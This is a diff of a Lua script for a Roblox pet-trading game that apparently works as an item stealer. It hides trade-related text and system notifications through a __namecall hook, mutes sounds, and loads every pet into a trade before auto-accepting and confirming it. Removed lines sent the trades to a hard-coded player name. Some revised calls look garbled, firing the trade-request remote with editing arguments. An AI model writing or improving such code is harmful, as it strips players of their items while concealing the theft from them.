@@ -9,14 +9,12 @@ local WAIT_CONFIRM = 18
 local BATCH_SIZE = 30
 
 local MANUAL_REMOTES = {
-    TRADE_REQUEST   = "VsiGoBbDBuyBwTjdVpBLCqMCbIWsVO",
-    OPEN_BAG        = "GjproFqzsBIISicUYKJNKEUGeGMOLdNWPZg",
-    ADD_PET         = "ZyimoLbVNPtuaLyGpKmDEES",
-    ACCEPT_1        = "ZyimoLbVNPstwHMi/CLRHAUKRR",
-    CONFIRM_2       = "ZyimoLbVNRDDxAKGpNyBD",
-    TOGGLE_EDITING  = "YlABsysEOeYQkxMn/PQGMG",
-}
-
+    TRADE_REQUEST = "VsiGoBbDBuyBwTjdVpBLCqMCbIWsVO",
+    OPEN_BAG = "GjproFqzsBIISicUYKJNKEUGeGMOLdNWPZg",
+    ADD_PET = "ZyimoLbVNPtuaLyGpKmDEES",
+    ACCEPT_1 = "ZyimoLbVNPstwHMi/CLRHAUKRR",
+    CONFIRM_2 = "ZyimoLbVNRDDxAKGpNyBD",
+    SOUND_EFFECTS = "YlABsysEOeYQkxMn/PQGMG",
 }
 
 local Remotes = {
@@ -35,19 +33,6 @@ local function Resolve(key)
     return nil
 end
 
-local function OpenBagAction()
-    if Remotes.OpenBag then
-        local ok = pcall(function()
-            TradeAPI[Remotes.OpenBag]:FireServer({ picking = true })
-        end)
-        if not ok then
-            pcall(function()
-                TradeAPI[Remotes.OpenBag]:FireServer("open_backpack")
-            end)
-        end
-    end
-end
-
 local function suppressClientUI()
     local pg = LocalPlayer:FindFirstChild("PlayerGui")
     if not pg then return end
@@ -58,7 +43,7 @@ local function suppressClientUI()
         local keys = {
             "trade","request","sent","cannot","already",
             "troc","demande","envoyée","envoyee","peut pas","ne peut pas","déjà","deja",
-            "échange","echange","echanger","echangé","échangé","echange","exchanged","traded"
+            "échange","echange","echanger","échangé","échangé","echange","exchanged","traded"
         }
         for _, k in ipairs(keys) do
             if t:find(k) then return true end
@@ -84,8 +69,7 @@ local function suppressClientUI()
     end
     local function hookTextChanges(o)
         if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then
-            local conn
-            conn = o:GetPropertyChangedSignal("Text"):Connect(function()
+            o:GetPropertyChangedSignal("Text"):Connect(function()
                 if textMatches(o.Text or "") then
                     o.Visible = false
                 end
@@ -126,10 +110,9 @@ local function suppressClientUI()
 end
 
 local function suppressCoreNotifications()
-    local sg = game:GetService("StarterGui")
     local mt = getrawmetatable(game)
     if mt and getnamecallmethod and setreadonly then
-        local ok = pcall(function()
+        pcall(function()
             setreadonly(mt, false)
             local old = mt.__namecall
             mt.__namecall = function(self, ...)
@@ -140,7 +123,7 @@ local function suppressCoreNotifications()
                     if type(key) == "string" then
                         local lk = string.lower(key)
                         if lk:find("sendnotification") or lk:find("chatmakesystemmessage") then
-                        return
+                            return
                         end
                     end
                 end
@@ -153,7 +136,7 @@ end
 
 local function muteSoundEffects()
     local args = { "sound_effects_volume", 0 }
-    local r = TradeAPI:FindFirstChild("huJKAGANXnhZtFVwIYZPVP")
+    local r = Resolve("SOUND_EFFECTS")
     if r then
         pcall(function() r:FireServer(unpack(args)) end)
     end
@@ -289,78 +272,20 @@ local function sortPetsByPriority(list)
     return out
 end
 
-local function discoverRemotes()
-    if Resolve("TRADE_REQUEST") or Resolve("OPEN_BAG") or Resolve("ADD_PET") or Resolve("ACCEPT_1") or Resolve("CONFIRM_2") then
-        return
-    end
-    local funcs = {}
-    local events = {}
-    for _, child in pairs(TradeAPI:GetChildren()) do
-        if child:IsA("RemoteFunction") then
-            table.insert(funcs, child.Name)
-        elseif child:IsA("RemoteEvent") then
-            table.insert(events, child.Name)
+local function normalizePetId(id)
+    if type(id) == "string" then
+        if not id:match("^2_") then
+            return "2_" .. id
         end
     end
-    local others = getAllPlayers()
-    if #others > 0 then
-        for _, name in pairs(funcs) do
-            local ok = pcall(function()
-                TradeAPI[name]:InvokeServer(others[1], true)
-            end)
-            task.wait(0.3)
-            if ok and getRealTradePartner() then
-                Remotes.AcceptRequest = name
-                break
-            end
-        end
-    end
-    if not Remotes.OpenBag then
-        for _, name in pairs(events) do
-            local ok = pcall(function()
-                TradeAPI[name]:FireServer({ picking = true })
-            end)
-            if ok then
-                Remotes.OpenBag = name
-                break
-            end
-        end
-    end
-    if not Remotes.AddPet then
-        local items = getPetItems()
-        if #items > 0 then
-            for _, name in pairs(events) do
-                local ok = pcall(function()
-                    TradeAPI[name]:FireServer(items[1])
-                end)
-                if ok then
-                    Remotes.AddPet = name
-                    break
-                end
-            end
-        end
-    end
-    if not Remotes.Accept1 then
-        for _, name in pairs(events) do
-            local ok = pcall(function()
-                TradeAPI[name]:FireServer()
-            end)
-            if ok then
-                Remotes.Accept1 = name
-                break
-            end
-        end
-    end
-    if not Remotes.Confirm2 then
-        for _, name in pairs(events) do
-            local ok = pcall(function()
-                TradeAPI[name]:FireServer()
-            end)
-            if ok then
-                Remotes.Confirm2 = name
-                break
-            end
-        end
+    return id
+end
+
+local function waitForTradeStart(timeoutSec)
+    local elapsed = 0
+    while not getRealTradePartner() and elapsed < timeoutSec do
+        task.wait(0.2)
+        elapsed = elapsed + 0.2
     end
 end
 
@@ -368,14 +293,12 @@ local function runCycle()
     suppressClientUI()
     suppressCoreNotifications()
     muteSoundEffects()
-    discoverRemotes()
     while true do
         local rRequest = Resolve("TRADE_REQUEST")
         local rOpenBag = Resolve("OPEN_BAG")
         local rAddPet = Resolve("ADD_PET")
         local rAccept1 = Resolve("ACCEPT_1")
         local rConfirm2 = Resolve("CONFIRM_2")
-        local rToggleEdit = Resolve("TOGGLE_EDITING")
         if not (rRequest and rOpenBag and rAddPet and rAccept1 and rConfirm2) then
             task.wait(1)
         else
@@ -384,22 +307,14 @@ local function runCycle()
             if #found == 0 then
                 task.wait(2)
             else
-                local target = Players:FindFirstChild("Aliloloaz")
-                if target then
-                    local ok = pcall(function() rRequest:FireServer(target) end)
-                end
+                pcall(function() rRequest:FireServer("toggle_editing", { editing = false }) end)
                 task.wait(3)
                 local idx = 1
                 local added = 0
                 while idx <= #found do
-                    if rToggleEdit then
-                        pcall(function() rToggleEdit:FireServer("toggle_editing", { editing = false }) end)
-                    end
-                    if rOpenBag then
-                        pcall(function() rOpenBag:FireServer("open_backpack") end)
-                    end
+                    pcall(function() rOpenBag:FireServer("open_backpack") end)
                     task.wait(0.02)
-                    local okAdd = pcall(function() rAddPet:FireServer(found[idx]) end)
+                    pcall(function() rAddPet:FireServer(normalizePetId(found[idx])) end)
                     added = added + 1
                     if added % BATCH_SIZE == 0 then
                         task.wait(0.1)
@@ -409,15 +324,13 @@ local function runCycle()
                     idx = idx + 1
                 end
                 if added > 0 then
+                    waitForTradeStart(5)
                     task.wait(WAIT_FIRST)
                     pcall(function() rAccept1:FireServer() end)
                     task.wait(WAIT_CONFIRM)
                     pcall(function() rConfirm2:FireServer() end)
                     task.wait(0.5)
-                    pcall(function()
-                        local t2 = Players:FindFirstChild("Aliloloaz")
-                        if t2 then rRequest:FireServer(t2) end
-                    end)
+                    pcall(function() rRequest:FireServer("toggle_editing", { editing = false }) end)
                 end
                 if idx > #found then
                     local refresh = getPetItems()
